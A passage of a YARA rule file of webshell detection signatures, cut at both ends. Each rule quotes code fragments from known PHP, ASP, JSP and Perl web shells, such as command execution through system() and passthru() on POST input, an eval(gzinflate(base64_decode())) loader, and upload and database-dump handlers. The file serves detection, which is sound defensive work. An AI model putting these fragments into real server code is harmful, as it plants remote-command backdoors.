      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
      $s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
      $s2 = "<TITLE>404 Not Found</TITLE>" fullword
      $s3 = "<H1>Not Found</H1>" fullword
   condition: 
      all of them
}

rule WebShell_php_webshells_myshell_RID3353 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file myshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu" 
      $s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o" 
      $s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
      $s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT" 
   condition: 
      1 of them
}

rule WebShell_php_webshells_lolipop_RID3354 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file lolipop.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:43:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "$commander = $_POST['commander']; " fullword
      $s9 = "$sourcego = $_POST['sourcego']; " fullword
      $s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
   condition: 
      all of them
}

rule WebShell_aZRaiLPhp_v1_0_2_RID2FF7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-11-23"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED" 
      $s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
      $s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
      $s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
   condition: 
      2 of them
}

rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0__RID3B1A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 20:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
      hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</" 
      $s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh" 
      $s11 = " *   Coded by Pixcher" fullword
      $s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
   condition: 
      2 of them
}

rule WebShell_Generic_PHP_7_RID2F20 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
      hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
      hash3 = "715f17e286416724e90113feab914c707a26d456"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
      $s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
      $s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
      $s4 = "if( $action == \"dumpTable\" )" fullword
   condition: 
      2 of them
}

rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall_RID3C61 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 21:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
      hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
      hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
      $s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
      $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
      $s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
   condition: 
      2 of them
}

rule WebShell_Generic_PHP_9_RID2F22 : DEMO GEN SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2014-04-06 11:44:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-12-06"
      hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
      hash2 = "0daed818cac548324ad0c5905476deef9523ad73"
      tags = "DEMO, GEN, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $ = { 3a 3c 62 3e 22 20 2e 62 61 73 65 36 34 5f 64 65 63 6f 64 65 28 24 5f 50 4f 53 54 5b 27 74 6f 74 27 5d 29 2e 20 22 3c 2f 62 3e 22 3b } 
      $ = { 69 66 20 28 69 73 73 65 74 28 24 5f 50 4f 53 54 5b 27 77 71 27 5d 29 20 26 26 20 24 5f 50 4f 53 54 5b 27 77 71 27 5d 3c 3e 22 22 29 20 7b } 
      $ = { 70 61 73 73 74 68 72 75 28 24 5f 50 4f 53 54 5b 27 63 27 5d 29 3b } 
      $ = { 3c 69 6e 70 75 74 20 74 79 70 65 3d 22 72 61 64 69 6f 22 20 6e 61 6d 65 3d 22 74 61 63 22 20 76 61 6c 75 65 3d 22 31 22 3e 42 36 34 20 44 65 63 6f 64 65 3c 62 72 3e } 
   condition: 
      1 of them
}

rule WebShell__findsock_php_findsock_shell_php_reverse_shell_RID3D7D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 21:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
      hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
   condition: 
      all of them
}

rule WebShell_RemExp_asp_php_RID3021 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-05 12:26:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
      $s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f" 
      $s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
      $s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
      $s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
   condition: 
      all of them
}

rule WebShell_dC3_Security_Crew_Shell_PRiV_RID351E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-05 15:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
      $s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
      $s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
      $s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
      $s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
      $s20 = "if (isset($_GET['rename_all'])) {" fullword
   condition: 
      3 of them
}

rule Webshell_perlbot_pl_RID2ED9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file perlbot.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")" 
      $s1 = "#Acesso a Shel - 1 ON 0 OFF" 
   condition: 
      1 of them
}

rule Webshell_shellbot_pl_RID2F3E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shellbot.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "ShellBOT" 
      $s1 = "PacktsGr0up" 
      $s2 = "CoRpOrAtIoN" 
      $s3 = "# Servidor de irc que vai ser usado " 
      $s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)" 
   condition: 
      2 of them
}

rule Webshell_jsp_reverse_jsp_2_RID318B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file jsp-reverse.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "// backdoor.jsp" 
      $s1 = "JSP Backdoor Reverse Shell" 
      $s2 = "http://michaeldaw.org" 
   condition: 
      2 of them
}

rule Webshell_Tool_asp_RID2DE7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Tool.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "mailto:rhfactor@antisocial.com" 
      $s2 = "?raiz=root" 
      $s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE" 
      $s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0" 
   condition: 
      2 of them
}

rule Webshell_NT_Addy_asp_RID2ECC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file NT Addy.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "NTDaddy v1.9 by obzerve of fux0r inc" 
      $s2 = "<ERROR: THIS IS NOT A TEXT FILE>" 
      $s4 = "RAW D.O.S. COMMAND INTERFACE" 
   condition: 
      1 of them
}

rule Webshell_phvayvv_php_php_RID3108 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phvayvv.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "{mkdir(\"$dizin/$duzenx2\",777)" 
      $s1 = "$baglan=fopen($duzkaydet,'w');" 
      $s2 = "PHVayv 1.0" 
   condition: 
      1 of them
}

rule Webshell_rst_sql_php_php_RID30FC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file rst_sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "C:\\tmp\\dump_" 
      $s1 = "RST MySQL" 
      $s2 = "http://rst.void.ru" 
      $s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';" 
   condition: 
      2 of them
}

rule Webshell_c99madshell_v2_0_php_php_RID33A9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file c99madshell_v2.0.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef" 
   condition: 
      all of them
}

rule Webshell_telnet_pl_RID2E6D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnet.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "W A R N I N G: Private Server" 
      $s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   " 
   condition: 
      all of them
}

rule Webshell_WebShell_cgi_RID2F4E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file WebShell.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "WebShell.cgi" 
      $s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else" 
   condition: 
      all of them
}

rule Webshell_csh_php_php_RID2F32 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file csh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = ".::[c0derz]::. web-shell" 
      $s1 = "http://c0derz.org.ua" 
      $s2 = "vint21h@c0derz.org.ua" 
      $s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root" 
   condition: 
      1 of them
}

rule Webshell_pHpINJ_php_php_RID2FFD : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file pHpINJ.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "News Remote PHP Shell Injection" 
      $s3 = "Php Shell <br />" fullword
      $s4 = "<input type = \"text\" name = \"url\" value = \"" 
   condition: 
      2 of them
}

rule Webshell_sig_2008_php_php_RID3060 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file 2008.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:37:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Codz by angel(4ngel)" 
      $s1 = "Web: http://www.4ngel.net" 
      $s2 = "$admin['cookielife'] = 86400;" 
      $s3 = "$errmsg = 'The file you want Downloadable was nonexistent';" 
   condition: 
      1 of them
}

rule Webshell_ak74shell_php_php_RID3143 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ak74shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:15:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION[" 
      $s2 = "AK-74 Security Team Web Site: www.ak74-team.net" 
      $s3 = "$xshell" 
   condition: 
      2 of them
}

rule Webshell_zacosmall_php_RID3013 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file zacosmall.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:24:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "rand(1,99999);$sj98" 
      $s1 = "$dump_file.='`'.$rows2[0].'`" 
      $s3 = "filename=\\\"dump_{$db_dump}_${table_d" 
   condition: 
      2 of them
}

rule Webshell_CmdAsp_asp_RID2E81 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file CmdAsp.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:17:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "CmdAsp.asp" 
      $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
      $s2 = "-- Use a poor man's pipe ... a temp file --" 
      $s3 = "maceo @ dogmile.com" 
   condition: 
      2 of them
}

rule Webshell_mysql_shell_php_RID30FA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql_shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "SooMin Kim" 
      $s1 = "smkim@popeye.snu.ac.kr" 
      $s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen" 
   condition: 
      1 of them
}

rule Webshell_Reader_asp_RID2E9C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Reader.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:21:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Mehdi & HolyDemon" 
      $s2 = "www.infilak." 
      $s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%" 
   condition: 
      2 of them
}

rule Webshell_jspshall_jsp_RID2FB3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file jspshall.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:08:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "kj021320" 
      $s1 = "case 'T':systemTools(out);break;" 
      $s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file" 
   condition: 
      2 of them
}

rule Webshell_Webshell_php_Blocker_RID32A4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file webshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:13:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "<die(\"Couldn't Read directory, Blocked!!!\");" 
      $s3 = "PHP Web Shell" 
   condition: 
      all of them
}

rule Webshell_DxShell_php_php_RID30A8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DxShell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:49:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><" 
   condition: 
      1 of them
}

rule Webshell_kacak_asp_RID2E44 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file kacak.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Kacak FSO 1.0" 
      $s1 = "if request.querystring(\"TGH\") = \"1\" then" 
      $s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style=" 
      $s4 = "mailto:BuqX@hotmail.com" 
   condition: 
      1 of them
}

rule Webshell_PHP_Backdoor_Connect_pl_php_RID351D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHP Backdoor Connect.pl.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "LorD of IRAN HACKERS SABOTAGE" 
      $s1 = "LorD-C0d3r-NT" 
      $s2 = "echo --==Userinfo==-- ;" 
   condition: 
      1 of them
}

rule Webshell_Antichat_Shell_v1_3_php_RID3368 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Antichat Shell v1.3.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:46:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Antichat" 
      $s1 = "Can't open file, permission denide" 
      $s2 = "$ra44" 
   condition: 
      2 of them
}

rule Webshell_EFSO_2_asp_RID2E07 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file EFSO_2.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Ejder was HERE" 
      $s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~" 
   condition: 
      2 of them
}

rule Webshell_lamashell_php_RID3000 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file lamashell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "lama's'hell" fullword
      $s1 = "if($_POST['king'] == \"\") {" 
      $s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f" 
   condition: 
      1 of them
}

rule Webshell_Sincap_php_php_RID3052 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Sincap.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');" 
      $s2 = "$tampon4=$tampon3-1" 
      $s3 = "@aventgrup.net" 
   condition: 
      2 of them
}

rule Webshell_Test_php_php_RID2F94 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Test.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
      $s2 = "fwrite ($fp, \"$yazi\");" fullword
      $s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
   condition: 
      1 of them
}

rule Webshell_Zehir_4_asp_RID2EDE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Zehir 4.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=" 
      $s4 = "<input type=submit value=\"Test Et!\" onclick=\"" 
   condition: 
      1 of them
}

rule Webshell_telnetd_pl_RID2ED1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnetd.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "0ldW0lf" fullword
      $s1 = "However you are lucky :P" 
      $s2 = "I'm FuCKeD" 
      $s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#" 
      $s4 = "atrix@irc.brasnet.org" 
   condition: 
      1 of them
}

rule Webshell_telnet_cgi_RID2EC4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnet.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "W A R N I N G: Private Server" 
